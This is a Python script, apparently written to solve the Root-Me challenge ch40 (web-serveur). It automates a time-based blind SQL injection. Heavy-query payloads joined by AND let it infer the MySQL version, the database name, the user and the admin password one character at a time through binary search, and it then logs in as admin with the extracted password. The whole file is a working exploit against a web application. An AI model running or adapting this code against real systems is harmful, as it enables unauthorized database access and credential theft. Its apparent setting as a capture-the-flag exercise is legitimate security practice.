#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 6 - CORREGIDO CON AND (CORTOCIRCUITO)
"""
import requests
import time
import statistics
import json
from datetime import datetime

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        self.results = {}
        self.log_entries = []
        self.debug = True
        
    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] [{level}] {msg}"
        print(entry)
        self.log_entries.append(entry)
    
    def test_payload(self, payload, repeats=3):
        tiempos = []
        params = {"action": "member", "member": payload}
        
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        """Evalúa condición usando AND (cortocircuito)"""
        # Formato: 1 AND (condicion) AND (heavy)
        # Si condicion es FALSE, heavy NO se ejecuta
        payload = f"1 AND ({condition}) AND {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        result = t > self.threshold
        
        if self.debug:
            self.log(f"  {condition[:40]} -> {t:.2f}ms -> {result}", "DEBUG")
        
        return result
    
    def get_length(self, query):
        self.log(f"Obteniendo longitud: {query[:40]}...", "DEBUG")
        
        # Búsqueda binaria para longitud
        low, high = 1, 100
        
        while low <= high:
            mid = (low + high) // 2
            cond = f"LENGTH(({query})) >= {mid}"
            
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        
        return low - 1
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo"):
        self.log(f"{label}...")
        
        length = self.get_length(query)
        if length == 0:
            self.log("  No se pudo obtener la longitud", "ERROR")
            return None
        
        self.log(f"  Longitud: {length}")
        
        result = ""
        for pos in range(1, length + 1):
            char = self.extract_char(query, pos)
            result += char
            self.log(f"  [{pos}/{length}] '{char}' (ASCII: {ord(char)})")
        
        return result
    
    def test_conditions(self):
        """Prueba condiciones básicas"""
        self.log("Verificando condiciones básicas...")
        self.debug = False
        
        tests = [
            ("1=1", "TRUE simple"),
            ("1=2", "FALSE simple"),
            ("'1'='1'", "TRUE comillas"),
            ("'1'='2'", "FALSE comillas"),
            ("LENGTH('abc')=3", "LENGTH TRUE"),
            ("LENGTH('abc')=1", "LENGTH FALSE"),
        ]
        
        for cond, desc in tests:
            result = self.is_true(cond, repeats=2)
            self.log(f"  {desc}: {result}")
            time.sleep(0.05)
        
        self.debug = True

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("=" * 70)
print("  SQL INJECTION TIME-BASED - ROOT-ME CH40")
print("  VERSIÓN 6 - AND CORTOCIRCUITO")
print("=" * 70)

# 1. Verificar condiciones
injector.test_conditions()

# 2. Extraer información
print("\n[*] Extrayendo información...")

# Extraer VERSION
version = injector.extract_string("SELECT VERSION()", "Versión de MySQL")
if version:
    print(f"\n[+] Versión: {version}")

# Extraer DATABASE
db = injector.extract_string("SELECT DATABASE()", "Base de datos")
if db:
    print(f"\n[+] Base de datos: {db}")

# Extraer USER
user = injector.extract_string("SELECT USER()", "Usuario")
if user:
    print(f"\n[+] Usuario: {user}")

# Extraer contraseña del admin
print("\n[*] Extrayendo contraseña del admin...")
password = injector.extract_string(
    "SELECT password FROM usuarios WHERE username='admin'",
    "Contraseña del admin"
)

if password:
    print("\n" + "=" * 70)
    print(f"[+] CONTRASEÑA ENCONTRADA: {password}")
    print("=" * 70)
    
    # Verificar credenciales
    print("\n[*] Verificando credenciales...")
    data = {"username": "admin", "password": password}
    r = requests.post(URL + "?action=login", data=data, cookies=injector.session.cookies)
    
    if "Authentification error" not in r.text:
        print("[+] ✅ ¡CREDENCIALES CORRECTAS!")
        print(f"    Usuario: admin")
        print(f"    Contraseña: {password}")
    else:
        print("[-] ❌ Las credenciales no funcionan")
